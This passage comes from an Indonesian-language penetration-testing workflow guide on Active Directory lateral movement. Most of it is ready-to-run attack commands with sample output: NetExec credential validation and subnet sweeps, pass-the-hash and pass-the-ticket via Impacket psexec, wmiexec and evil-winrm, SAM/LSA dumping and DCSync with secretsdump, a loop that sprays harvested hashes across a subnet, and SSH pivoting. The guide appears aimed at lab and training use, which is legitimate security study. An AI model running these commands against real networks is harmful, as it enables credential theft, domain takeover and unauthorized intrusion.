# Test simple TCP endpoint
proxychains \
    nc \
    -vz \
    10.10.10.50 \
    445
```

Jika gagal:

```text
Check:
[ ] tunnel active
[ ] SOCKS listener active
[ ] proxy config correct
[ ] route target correct
[ ] DNS issue
[ ] tool supports proxychains
```

---

# 🧠 16. GOLDEN RULES LATERAL MOVEMENT

## Rule 1 — ✅ SELALU VALIDASI DENGAN NETEXEC

```text
Credential obtained
       │
       ▼
NETEXEC
       │
       ▼
Know where credential works
```

---

## Rule 2 — 🌐 Jangan Cek Satu Target Saja

Credential:

```text
TARGET01
```

belum tentu menarik.

Scan controlled subnet:

```text
TARGET01
TARGET02
TARGET03
DC
FILE
WEB
SQL
```

---

## Rule 3 — 🧾 Net-NTLMv2 ≠ NT Hash

```text
Net-NTLMv2
   ├── crack
   └── relay

NT hash
   ├── PTH
   └── Overpass-the-Hash
```

---

## Rule 4 — 🎫 Kerberos Butuh Hostname/SPN

```text
Kerberos
   │
   ▼
SPN
   │
   ▼
Hostname
```

Jangan sembarangan mengganti:

```text
hostname
```

menjadi:

```text
IP
```

---

## Rule 5 — ⏰ Clock Sync Wajib

```text
Kerberos troubleshooting
        │
        ▼
Check time
```

---

## Rule 6 — 🔎 `(Pwn3d!)` Bukan Berarti Domain Admin

```text
(Pwn3d!)
   =
admin-level access
on that target
```

bukan:

```text
Domain Admin
```

---

## Rule 7 — 🧠 Authentication ≠ Authorization

Credential valid:

```text
Authentication
    ✓
```

tidak otomatis:

```text
Authorization
    ✓
```

---

## Rule 8 — 🔁 Reuse Credential Secara Sistematis

Jangan menebak.

Gunakan:

```text
credential
   │
   ▼
controlled target validation
   │
   ▼
map access
```

---

## Rule 9 — 🧭 Setelah Dapat Host Baru, Ulangi Enumeration

```text
NEW HOST
  │
  ├── identity
  ├── privileges
  ├── credentials
  ├── services
  └── network
```

---

## Rule 10 — 🎯 Pilih Protocol Berdasarkan Target

```text
445   → SMB
5985  → WinRM
3389  → RDP
22    → SSH
1433  → MSSQL
```

---

## Rule 11 — 🧩 Satu Credential Bisa Menciptakan Banyak Path

```text
ONE CREDENTIAL
      │
 ┌────┼────┬────┐
 ▼    ▼    ▼    ▼
SMB  WinRM RDP  MSSQL
```

---

## Rule 12 — 🪪 Certificate Harus Dipandang sebagai Credential

```text
PFX
 │
 ▼
PKINIT
 │
 ▼
TGT
 │
 ▼
Lateral Movement
```

---

# ⚡ 17. CHEATSHEET LATERAL MOVEMENT

# === VALIDASI CREDENTIAL ===

```bash
# [1] Validate NT hash on one host
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH"
```

```bash
# [2] Validate NT hash across the lab subnet
netexec smb 10.10.10.0/24 \
    -u "$USERNAME" \
    -H "NTHASH" \
    --no-bruteforce
```

```bash
# [3] Check WinRM
netexec winrm "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH"
```

---

# === PASS-THE-HASH ===

```bash
# [1] PsExec
python3 /opt/impacket/examples/psexec.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP"
```

```bash
# [2] WMIExec
python3 /opt/impacket/examples/wmiexec.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP"
```

```bash
# [3] SMBExec
python3 /opt/impacket/examples/smbexec.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP"
```

```bash
# [4] Evil-WinRM
evil-winrm \
    -i "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH"
```

---

# === PASS-THE-TICKET ===

```bash
# [1] Request TGT from password
python3 /opt/impacket/examples/getTGT.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"
```

```bash
# [2] Load ticket
export KRB5CCNAME="$PWD/$USERNAME.ccache"

# Verify
klist
```

```bash
# [3] Use Kerberos ticket
python3 /opt/impacket/examples/wmiexec.py \
    -k \
    -no-pass \
    "$DOMAIN/$USERNAME@$TARGET_HOSTNAME"
```

---

# === CREDENTIAL DUMPING ===

```bash
# [1] Dump SAM
python3 /opt/impacket/examples/secretsdump.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP"
```

```bash
# [2] DCSync
python3 /opt/impacket/examples/secretsdump.py \
    -just-dc \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$DC_IP"
```

```bash
# [3] NetExec SAM/LSA
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    --sam \
    --lsa
```

---

# === FILE OPERATIONS ===

```bash
# [1] Enumerate SMB shares
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    --shares
```

```bash
# [2] Connect to SMB share
smbclient \
    "//$TARGET_IP/C$" \
    -U "$DOMAIN\\$USERNAME%$PASSWORD"
```

---

# === PIVOTING CEPAT ===

```bash
# [1] SSH local port forwarding
ssh \
    -L 3390:10.10.10.50:3389 \
    "$USERNAME@$PIVOT_HOST"
```

```bash
# [2] SSH SOCKS proxy
ssh \
    -D 1080 \
    "$USERNAME@$PIVOT_HOST"
```

---

# 🧠 18. CROSS-WORKFLOW

## ← File 41 — NTLM Relay

File 41 menjelaskan bagaimana memperoleh:

```text
hash
ticket
authenticated session
certificate
```

File 42 menjelaskan apa yang dilakukan **setelah mendapatkan credential/access material tersebut**.

```text
File 41
   │
   ▼
Relay
   │
   ├── NT hash
   ├── Kerberos material
   └── certificate
         │
         ▼
File 42
   │
   ▼
Lateral Movement
```

← [**File 41: NTLM Relay**](https://chatgpt.com/41-ntlm-relay/[🔁 Workflow 41 — NTLM Relay](/docs/ntlm-relay))

---

## ← File 37 — Kerberoasting & AS-REP Roasting

Kerberoasting dapat menghasilkan:

```text
encrypted TGS
   │
   ▼
cracking
   │
   ▼
service account password
   │
   ▼
NetExec
   │
   ▼
Lateral Movement
```

Contoh:

```text
svc_sql
   │
   └── cracked password
          │
          ▼
      SQL01 / WEB01 / FILE01
```

← [**File 37: Kerberoasting & AS-REP Roasting**](https://chatgpt.com/37-kerberoasting-asrep-roasting/[🔥 Workflow 37 — Kerberoasting & AS-REP Roasting](/docs/kerberoasting-asreproasting))

---

## ← File 38 — AD ACL Abuse

ACL abuse dapat menghasilkan:

```text
new permissions
new credential access
group membership
delegation
```

Kemudian:

```text
ACL Abuse
    │
    ▼
Credential / Privilege
    │
    ▼
Lateral Movement
```

← [**File 38: AD ACL Abuse**](https://chatgpt.com/38-ad-acl-abuse/[🔐 File 38 — Active Directory ACL Abuse Workflow](/docs/ad-acl-abuse))

---

## → File 43 — Domain Persistence

Setelah lateral movement menghasilkan:

```text
high privilege
```

berikutnya:

```text
Persistence
```

Mental model:

```text
Lateral Movement
       │
       ▼
High Privilege
       │
       ▼
Persistence
```

→ [**File 43: Domain Persistence**](https://chatgpt.com/43-domain-persistence/<a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>)

---

## → File 44 — Linux PrivEsc

Jika lateral movement membawa kita ke Linux:

```text
Lateral Movement
       │
       ▼
Linux Shell
       │
       ▼
Linux PrivEsc
```

→ [**File 44: Linux PrivEsc**](https://chatgpt.com/44-linux-privesc/<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>)

---

## → File 45 — Windows PrivEsc

Jika target berikutnya Windows:

```text
Lateral Movement
       │
       ▼
Windows Shell
       │
       ▼
Windows PrivEsc
```

→ [**File 45: Windows PrivEsc**](https://chatgpt.com/45-windows-privesc/<a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>)

---

# 🧠 19. FINAL MENTAL MODEL

Jangan berpikir:

```text
"Dapat shell → selesai."
```

Gunakan:

```text
                 INITIAL FOOTHOLD
                       │
                       ▼
                WHO AM I?
                       │
                       ▼
                WHAT DO I HAVE?
                       │
          ┌────────────┼─────────────┐
          │            │             │
          ▼            ▼             ▼
       PASSWORD      NT HASH        TGT
          │            │             │
          │            │             ▼
          │            │          Kerberos
          │            │             │
          └──────┬─────┘             │
                 ▼                   │
              NETEXEC ◄──────────────┘
                 │
                 ▼
        WHERE DOES IT WORK?
                 │
       ┌─────────┼──────────┐
       │         │          │
       ▼         ▼          ▼
      WEB       FILE        SQL
       │         │          │
       ▼         ▼          ▼
     WinRM      SMB       MSSQL
       │         │          │
       └─────────┼──────────┘
                 ▼
              NEW HOST
                 │
                 ▼
             ENUM AGAIN
                 │
       ┌─────────┼─────────┐
       │         │         │
       ▼         ▼         ▼
     CREDENTIAL ACL      PRIVESC
       │         │         │
       └─────────┼─────────┘
                 ▼
             REPEAT
```

---

# 🔁 19.1 The Lateral Movement Loop

```text
┌────────────────────────────────────────────┐
│                                            │
│  1. GET CREDENTIAL                         │
│             │                              │
│             ▼                              │
│  2. VALIDATE WITH NETEXEC                  │
│             │                              │
│             ▼                              │
│  3. IDENTIFY TARGETS                       │
│             │                              │
│             ▼                              │
│  4. CHECK PROTOCOL                         │
│             │                              │
│             ▼                              │
│  5. REMOTE ACCESS                          │
│             │                              │
│             ▼                              │
│  6. ENUMERATE NEW HOST                     │
│             │                              │
│             ▼                              │
│  7. COLLECT MORE CREDENTIALS               │
│             │                              │
│             ▼                              │
│  8. PRIVILEGE ESCALATION                   │
│             │                              │
│             ▼                              │
│            REPEAT                          │
│                                            │
└────────────────────────────────────────────┘
```

---

# 🎯 19.2 Pertanyaan yang Harus Otomatis Keluar Saat Dapat Credential

```text
"Credential apa yang saya dapat?"

      │
      ├── Password
      ├── NT hash
      ├── TGT/TGS
      ├── PFX
      └── SSH key

"Di mana credential ini valid?"

      │
      ▼
   NETEXEC

"Target mana yang menarik?"

      │
      ├── DC
      ├── File Server
      ├── Web Server
      ├── SQL Server
      └── Workstation

"Protocol apa yang tersedia?"

      │
      ├── SMB
      ├── WinRM
      ├── WMI
      ├── RDP
      ├── SSH
      └── MSSQL

"Apa yang saya dapat setelah masuk?"

      │
      ├── credential
      ├── ticket
      ├── privilege
      ├── config
      └── new network route
```

---

# ✅ 20. LATERAL MOVEMENT CHECKLIST

```text
[ ] Identify current hostname
[ ] Identify current user
[ ] Run whoami /all
[ ] Identify current privilege
[ ] Inventory credential material
[ ] Determine credential type
[ ] Normalize NT hash format
[ ] Validate credential with NetExec
[ ] Validate against multiple authorized lab hosts
[ ] Identify SMB
[ ] Identify WinRM
[ ] Identify RDP
[ ] Identify SSH
[ ] Identify MSSQL
[ ] Check Kerberos ticket
[ ] Check correct hostname/SPN
[ ] Check clock sync
[ ] Choose least complicated viable remote protocol
[ ] Perform lateral movement
[ ] Enumerate newly compromised host
[ ] Search for additional credentials
[ ] Check privilege escalation opportunities
[ ] Check internal network access
[ ] Determine whether pivoting is required
[ ] Document credentials discovered
[ ] Cleanup temporary tunnels/artifacts where required
```

---

# 🏁 21. ONE-MINUTE SUMMARY

```text
PASSWORD
   │
   ▼
NETEXEC
   │
   ▼
VALID?
   │
   ▼
TARGET DISCOVERY
   │
   ├── 445  → SMB
   ├── 5985 → WinRM
   ├── 3389 → RDP
   ├── 22   → SSH
   └── 1433 → MSSQL
```

Dengan NT hash:

```text
NT HASH
   │
   ├── PTH
   │     ├── SMB
   │     └── WMI
   │
   └── OPtH
         │
         ▼
        TGT
         │
         ▼
      Kerberos
```

Dengan TGT:

```text
TGT
 │
 ▼
Hostname + SPN
 │
 ▼
Kerberos
 │
 ▼
SMB/WMI/other service
```

Dengan PFX:

```text
PFX
 │
 ▼
PKINIT
 │
 ▼
TGT
 │
 ▼
Lateral Movement
```

Dengan SSH key:

```text
SSH KEY
   │
   ▼
SSH
   │
   ▼
Linux HOST
```

---

# 🧠 FINAL GOLDEN MENTAL MODEL

> **Lateral movement bukan sekadar "remote shell".**

Yang sebenarnya kamu lakukan adalah:

```text
CREDENTIAL
    │
    ▼
IDENTITY
    │
    ▼
TARGET
    │
    ▼
PROTOCOL
    │
    ▼
AUTHENTICATION
    │
    ▼
AUTHORIZATION
    │
    ▼
REMOTE ACCESS
    │
    ▼
NEW HOST
    │
    ▼
NEW CREDENTIALS
    │
    ▼
NEW TARGETS
```

Dan muscle memory paling penting:

```text
┌──────────────────────────────────────────┐
│                                          │
│   CREDENTIAL → NETEXEC → MAP ACCESS      │
│                    │                     │
│                    ▼                     │
│                CHOOSE HOST               │
│                    │                     │
│                    ▼                     │
│              CHOOSE PROTOCOL             │
│                    │                     │
│                    ▼                     │
│             LATERAL MOVEMENT             │
│                    │                     │
│                    ▼                     │
│              ENUM NEW HOST               │
│                    │                     │
│                    ▼                     │
│                  REPEAT                  │
│                                          │
└──────────────────────────────────────────┘
```

> **Jangan langsung memakai `psexec`, `wmiexec`, atau `evil-winrm` hanya karena kamu memiliki credential. Validasi dulu dengan NetExec, tentukan di mana credential tersebut valid, lihat service yang tersedia, lalu pilih jalur lateral movement yang paling sesuai.**

---

# [🧭 Workflow 42 — Lateral Movement](/docs/lateral-movement) — Complete Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.
> 
> **Prerequisites:** Sudah punya credential dari [🔁 Workflow 41 — NTLM Relay](/docs/ntlm-relay), [🔥 Workflow 37 — Kerberoasting & AS-REP Roasting](/docs/kerberoasting-asreproasting), atau fase exploitation sebelumnya.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export DOMAIN="CORP.LOCAL"
export DC_IP="10.10.11.10"
export TARGET_IP="10.10.11.200"
export TARGET_HOSTNAME="FILE01.CORP.LOCAL"
export USERNAME=""
export PASSWORD=""
export NT_HASH="aad3b435b51404eeaad3b435b51404ee:NTHASHHERE"
export LHOST="10.10.14.5"

# Buat direktori kerja
mkdir -p ~/lateral/{loot,tickets,shells,logs,creds}
cd ~/lateral

# Setup tmux (WAJIB — butuh 3 panel bersamaan)
tmux new -s lateral
# Ctrl+B + % → Split Vertikal | Ctrl+B + " → Split Horizontal

echo "[*] Environment: $TARGET_IP | Domain: $DOMAIN | User: $USERNAME"
```

**Layout tmux yang direkomendasikan:**

text

```
┌─────────────────────────────────┬─────────────────────────────────┐
│ PANEL 1                         │ PANEL 2                         │
│ NetExec / Validation            │ Shell / Execution               │
│ Credential Spray & Recon        │ psexec/wmiexec/winrm            │
├─────────────────────────────────┴─────────────────────────────────┤
│ PANEL 3                                                           │
│ Credential Harvesting / secretsdump / Monitoring                  │
└───────────────────────────────────────────────────────────────────┘
```

---

## ═══════════════════════════════════════

## FASE 0: INVENTORY CREDENTIAL — APA YANG KAMU PUNYA?

## ═══════════════════════════════════════

> **LANGKAH PERTAMA SELALU INI.** Jangan langsung jalankan psexec atau tool apapun sebelum tahu jenis credential yang dimiliki.

### Langkah 0.1 — Identifikasi Tipe Credential

Bash

```
# Cek semua credential yang sudah dikumpulkan
cat ~/lateral/creds/*.txt 2>/dev/null || echo "Belum ada file creds"

# Format NT Hash yang benar untuk Impacket (LM:NT)
echo "Format Impacket: aad3b435b51404eeaad3b435b51404ee:NTHASH"
echo "Format NetExec -H: NTHASH (tanpa LM)"

# Cek apakah ada Kerberos ticket
ls -la ~/lateral/tickets/*.ccache 2>/dev/null
klist 2>/dev/null

# Cek apakah ada SSH key
ls -la ~/lateral/creds/*.pem ~/lateral/creds/id_rsa 2>/dev/null
```

**Checklist credential — centang yang dimiliki:**

text

```
[ ] Plaintext password → bisa SMB, WinRM, RDP, SSH, Kerberos
[ ] NT Hash (format LM:NT) → PTH via SMB/WMI, atau OPtH → TGT
[ ] Kerberos TGT (.ccache) → semua Kerberos service (pakai hostname!)
[ ] Kerberos TGS (.ccache) → service spesifik
[ ] Certificate/PFX → PKINIT → TGT
[ ] SSH Private Key → SSH only
[ ] Net-NTLMv2 → HARUS crack dulu atau relay (TIDAK bisa PTH langsung!)
```

**KRITIS — Jangan keliru:**

text

```
Net-NTLMv2 (dari Responder):
  john::CORP:1122...:a1b2...:0101...
  → TIDAK bisa langsung PTH!
  → Harus crack hashcat -m 5600 ATAU relay

NT Hash (dari SAM/secretsdump):
  fc525c9683e8fe067095ba2ddc971881
  → BISA PTH langsung!
```

---

### Langkah 0.2 — Sync Waktu (KRITIS untuk Kerberos)

Bash

```
# Selalu sync waktu jika akan pakai Kerberos
date
timedatectl

# Sync dengan DC
sudo ntpdate -u $DC_IP 2>/dev/null || sudo rdate -n $DC_IP 2>/dev/null
date  # Verifikasi sudah sync
```

**OUTPUT GAGAL ❌ — Nanti muncul KRB_AP_ERR_SKEW:**

text

```
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

➡️ Paksa sync manual:

Bash

```
sudo date -s "$(ntpdate -q $DC_IP 2>/dev/null | tail -1 | awk '{print $1,$2}')"
```

---

## ═══════════════════════════════════════

## FASE 1: VALIDASI CREDENTIAL — DIMANA CREDENTIAL INI VALID?

## ═══════════════════════════════════════

> **ATURAN BESI:** Selalu validasi dengan NetExec SEBELUM menjalankan psexec/wmiexec/winrm. Jangan buang waktu dengan tool yang salah.

### Langkah 1.1 — Scan Subnet dengan Credential

Bash

```
# Command 1: Validasi ke satu host dulu (cepat)
nxc smb $TARGET_IP -u "$USERNAME" -p "$PASSWORD"

# Command 2: Jika punya NT hash (format: NTHASH saja, tanpa LM)
nxc smb $TARGET_IP -u "$USERNAME" -H "NTHASH_ONLY"

# Command 3: Sweep ke seluruh subnet — JANGAN SKIP INI
nxc smb 10.10.11.0/24 -u "$USERNAME" -p "$PASSWORD" --no-bruteforce 2>/dev/null | tee ~/lateral/logs/sweep_smb.txt

# Command 4: Jika NT hash
nxc smb 10.10.11.0/24 -u "$USERNAME" -H "NTHASH_ONLY" --no-bruteforce 2>/dev/null | tee ~/lateral/logs/sweep_hash.txt

# Filter hasil positif
grep "\[+\]" ~/lateral/logs/sweep_smb.txt
grep "Pwn3d" ~/lateral/logs/sweep_smb.txt
```

**OUTPUT BERHASIL ✅ — Standard user valid:**

text

```
SMB  10.10.11.200  445  FILE01  [+] CORP\diana:Welcome2023!
SMB  10.10.11.100  445  WEB01   [+] CORP\diana:Welcome2023!
```

**Artinya:** Credential valid di 2 host, tapi bukan admin lokal (tidak ada `Pwn3d!`). Lanjut ke Langkah 1.2.

**OUTPUT BERHASIL ✅ — Admin credentials (JACKPOT):**

text

```
SMB  10.10.11.200  445  FILE01  [+] CORP\diana:Welcome2023! (Pwn3d!)
SMB  10.10.11.150  445  SQL01   [+] CORP\diana:Welcome2023! (Pwn3d!)
```

**Artinya:** `(Pwn3d!)` = admin-level access di host tersebut. **BUKAN berarti Domain Admin!**

➡️ Lanjut ke **Fase 2 (Remote Execution)** untuk host yang Pwn3d!

**OUTPUT GAGAL ❌ — Authentication failure:**

text

```
SMB  10.10.11.200  445  FILE01  [-] CORP\diana:Welcome2023! STATUS_LOGON_FAILURE
```

➡️ Kemungkinan: username salah, password salah, domain salah, atau NTLM disabled.

Bash

```
# Coba variasi
nxc smb $TARGET_IP -u "$USERNAME" -p "$PASSWORD" --local-auth  # Local account
nxc smb $TARGET_IP -u "Administrator" -p "$PASSWORD"           # Coba Administrator
nxc smb $TARGET_IP -u "$USERNAME" -p "$PASSWORD" -d "."        # Local domain
```

---

### Langkah 1.2 — Cek Semua Protocol Sekaligus

Bash

```
# Cek semua service yang tersedia di target — jalankan semua!
nxc smb $TARGET_IP -u "$USERNAME" -p "$PASSWORD"         # Port 445
nxc winrm $TARGET_IP -u "$USERNAME" -p "$PASSWORD"       # Port 5985
nxc rdp $TARGET_IP -u "$USERNAME" -p "$PASSWORD"         # Port 3389
nxc ssh $TARGET_IP -u "$USERNAME" -p "$PASSWORD"         # Port 22
nxc mssql $TARGET_IP -u "$USERNAME" -p "$PASSWORD"       # Port 1433
nxc ftp $TARGET_IP -u "$USERNAME" -p "$PASSWORD"         # Port 21
```

**Cara baca output dan tindakan:**

|Output|Artinya|Tindakan|
|---|---|---|
|`[+] user (Pwn3d!)`|Admin lokal|→ Fase 2 (Shell execution)|
|`[+] user` tanpa Pwn3d|Valid tapi bukan admin|→ Enum share, cek WinRM|
|`[-]`|Auth gagal|Coba credential lain|
|Port timeout|Service tidak jalan|Skip port ini|

Bash

```
# Simpan hasil semua protocol
for proto in smb winrm rdp ssh mssql; do
    echo "=== Testing $proto ===" >> ~/lateral/logs/proto_check.txt
    nxc $proto $TARGET_IP -u "$USERNAME" -p "$PASSWORD" >> ~/lateral/logs/proto_check.txt 2>/dev/null
done
cat ~/lateral/logs/proto_check.txt
```

---

## ═══════════════════════════════════════

## FASE 2: PASS-THE-HASH (PTH) — EKSEKUSI REMOTE

## ═══════════════════════════════════════

> **Masuk sini jika:** Punya NT Hash dan target menunjukkan `(Pwn3d!)` atau `[+]`

### Langkah 2.1 — Pilih Method Eksekusi

**Decision tree sebelum eksekusi:**

text

```
Punya (Pwn3d!) di target
│
├─ Port 5985 open → evil-winrm (PALING NYAMAN, PowerShell interaktif)
├─ Port 445 open → psexec / wmiexec / smbexec
│   ├─ psexec → SYSTEM shell (noisy, buat service)
│   ├─ wmiexec → User-context shell (lebih stealth)
│   └─ smbexec → Alternatif jika psexec gagal
└─ Port 3389 open → RDP (jika butuh GUI)
```

---

### Langkah 2.2 — PsExec (SYSTEM Shell via SMB)

Bash

```
# Method 1: Dengan password
impacket-psexec "CORP/$USERNAME:$PASSWORD@$TARGET_IP"

# Method 2: Dengan NT Hash (format LM:NT)
impacket-psexec "$USERNAME@$TARGET_IP" -hashes "$NT_HASH"

# Method 3: Alternatif binary name
python3 /opt/impacket/examples/psexec.py "CORP/$USERNAME:$PASSWORD@$TARGET_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Requesting shares on 10.10.11.200.....
[*] Found writable share ADMIN$
[*] Uploading file abcd1234.exe
[*] Opening SVCManager on 10.10.11.200
[*] Creating service abcd on 10.10.11.200
[*] Starting service abcd
[!] Press help for extra shell commands
C:\Windows\system32> whoami
nt authority\system
```

➡️ SYSTEM shell! Langsung jalankan **5 Command Pertama** (Langkah 2.5)

**OUTPUT GAGAL ❌ — Access Denied:**

text

```
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

➡️ Bukan karena credential salah — mungkin service creation diblokir atau UAC. Coba wmiexec:

Bash

```
impacket-wmiexec "$USERNAME@$TARGET_IP" -hashes "$NT_HASH"
```

**OUTPUT GAGAL ❌ — Share not writable:**

text

```
[-] SMB SessionError: STATUS_ACCESS_DENIED
```

➡️ Cek share yang accessible:

Bash

```
nxc smb $TARGET_IP -u "$USERNAME" -H "NTHASH" --shares
```

---

### Langkah 2.3 — WMIExec (Lebih Stealth)

Bash

```
# Dengan password
impacket-wmiexec "CORP/$USERNAME:$PASSWORD@$TARGET_IP"

# Dengan NT Hash
impacket-wmiexec "$USERNAME@$TARGET_IP" -hashes "$NT_HASH"

# One-liner command tanpa interactive shell
impacket-wmiexec "CORP/$USERNAME:$PASSWORD@$TARGET_IP" "whoami /all"
impacket-wmiexec "CORP/$USERNAME:$PASSWORD@$TARGET_IP" "ipconfig /all"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\> whoami
corp\diana
C:\> whoami /groups
```

**Perbandingan psexec vs wmiexec:**

|Aspek|psexec|wmiexec|smbexec|
|---|---|---|---|
|Privilege|SYSTEM|User context|SYSTEM|
|Service/binary|Dibuat|Tidak|Minimal|
|Noise level|HIGH|MEDIUM|MEDIUM|
|Port|445|135+445|445|
|Kapan pakai|Butuh SYSTEM|Default pilihan|Backup psexec|

---

### Langkah 2.4 — Evil-WinRM (TERBAIK untuk Interaktivitas)

Bash

```
# Cek dulu apakah WinRM open
nmap -p 5985,5986 $TARGET_IP

# Dengan password
evil-winrm -i $TARGET_IP -u "$USERNAME" -p "$PASSWORD"

# Dengan NT Hash
evil-winrm -i $TARGET_IP -u "$USERNAME" -H "NTHASH_ONLY"

# Dengan domain
evil-winrm -i $TARGET_IP -u "CORP\\$USERNAME" -p "$PASSWORD"
```

**OUTPUT BERHASIL ✅:**

text

```
Evil-WinRM shell v3.5
Warning: Remote path completions is disabled due to ruby limitation
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\diana\Documents>
```

**Fitur berguna di evil-winrm:**

PowerShell

```
# Upload file ke target
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe

# Download file dari target
*Evil-WinRM* PS C:\> download C:\Users\diana\secret.txt /local/path/

# List semua service
*Evil-WinRM* PS C:\> Get-Service

# Import PowerShell module
*Evil-WinRM* PS C:\> Import-Module C:\Windows\Temp\PowerView.ps1
```

**OUTPUT GAGAL ❌ — WinRM tidak bisa connect:**

text

```
Error: An error of type WinRM::WinRMAuthorizationError happened
```

➡️ User tidak punya WinRM rights. Coba SMB/psexec sebagai gantinya, atau cek apakah user ada di grup "Remote Management Users":

Bash

```
nxc smb $TARGET_IP -u "$USERNAME" -p "$PASSWORD" -x "net localgroup 'Remote Management Users'"
```

---

### Langkah 2.5 — 5 Command PERTAMA Setelah Dapat Shell

> **WAJIB dijalankan setiap kali dapat shell baru. Jangan skip.**

**Untuk Windows shell:**

cmd

```
:: 1. Siapa aku dan privilege apa?
whoami /all

:: 2. Hostname dan network configuration
hostname && ipconfig /all

:: 3. User lain yang sedang aktif
query user 2>nul

:: 4. Local Administrators group
net localgroup administrators

:: 5. Credential tersimpan
cmdkey /list
```

**Untuk Linux shell:**

Bash

```
# 1. Identitas dan grup
id && whoami

# 2. Sudo privileges
sudo -l

# 3. Hostname dan network
hostname && ip addr && ip route

# 4. User lain dengan login shell
cat /etc/passwd | grep -v nologin | grep -v false

# 5. SSH keys di filesystem
find /home /root -name "id_rsa" -o -name "*.pem" 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Dapat informasi berguna:**

text

```
C:\> whoami /all
USER INFORMATION
User Name    SID
============ ====
corp\diana   S-1-5-21-...

GROUP INFORMATION
Group Name                         Type
================================== ====
CORP\IT_Admins                     Group      ← MENARIK!
CORP\Domain Users                  Group
BUILTIN\Remote Desktop Users       Group

PRIVILEGES INFORMATION
Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeImpersonatePrivilege        Impersonate client after auth  Enabled  ← CEK PRIVESC!
```

➡️ `SeImpersonatePrivilege` → potensi privesc! Ke `<a href="/docs/token-impersonation" class="text-[#00b4d8] hover:underline font-mono font-semibold">46_token_impersonation_workflow.md</a>`  
➡️ Keanggotaan grup IT_Admins → akses ke resource lain

---

## ═══════════════════════════════════════

## FASE 3: CREDENTIAL HARVESTING — KUMPULKAN LEBIH BANYAK

## ═══════════════════════════════════════

> **Setelah dapat shell, jangan langsung pindah ke host lain. Kumpulkan credential dulu!**

### Langkah 3.1 — Dump SAM dan LSA (Admin Required)

Bash

```
# Method 1: NetExec langsung (paling cepat)
nxc smb $TARGET_IP -u "$USERNAME" -H "NTHASH" --sam
nxc smb $TARGET_IP -u "$USERNAME" -H "NTHASH" --lsa

# Method 2: secretsdump (lebih lengkap)
impacket-secretsdump "CORP/$USERNAME:$PASSWORD@$TARGET_IP"
impacket-secretsdump "$USERNAME@$TARGET_IP" -hashes "$NT_HASH"

# Simpan output
impacket-secretsdump "CORP/$USERNAME:$PASSWORD@$TARGET_IP" | tee ~/lateral/loot/secretsdump_$TARGET_IP.txt
```

**OUTPUT BERHASIL ✅ — SAM dump:**

text

```
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x3f...

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
svc_backup:1001:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::

[*] Dumping LSA Secrets
CORP\svc_sql:ServicePass2024!      ← PLAINTEXT!
_SC_MSSQL:sql_service_password     ← Service account
```

Bash

```
# Ekstrak NT hash saja untuk digunakan
cat ~/lateral/loot/secretsdump_$TARGET_IP.txt | grep ":::" | awk -F: '{print $1":"$4}' | tee ~/lateral/creds/new_hashes.txt

# Simpan format lengkap
cat ~/lateral/loot/secretsdump_$TARGET_IP.txt | grep ":::" >> ~/lateral/creds/all_hashes.txt
```

---

### Langkah 3.2 — Otomasi Spray Hash Baru ke Seluruh Network

Bash

```
# Spray semua hash yang baru didapat ke seluruh subnet
while IFS=: read -r user hash; do
    [ -z "$user" ] || [ -z "$hash" ] && continue
    echo "[*] Testing: $user"
    nxc smb 10.10.11.0/24 -u "$user" -H "aad3b435b51404eeaad3b435b51404ee:$hash" \
        --no-bruteforce 2>/dev/null | grep -E "Pwn3d|\[\+\]"
done < ~/lateral/creds/new_hashes.txt | tee ~/lateral/logs/hash_spray_results.txt

# Tampilkan hasilnya
echo "=== VALID CREDENTIALS ==="
grep "\[+\]" ~/lateral/logs/hash_spray_results.txt
echo "=== ADMIN ACCESS ==="
grep "Pwn3d" ~/lateral/logs/hash_spray_results.txt
```

**OUTPUT BERHASIL ✅ — Hash baru valid di host lain:**

text

```
[*] Testing: Administrator
SMB  10.10.11.10   445  DC01    [+] CORP\Administrator:fc525c... (Pwn3d!)
SMB  10.10.11.150  445  SQL01   [+] CORP\Administrator:fc525c... (Pwn3d!)

[*] Testing: svc_backup
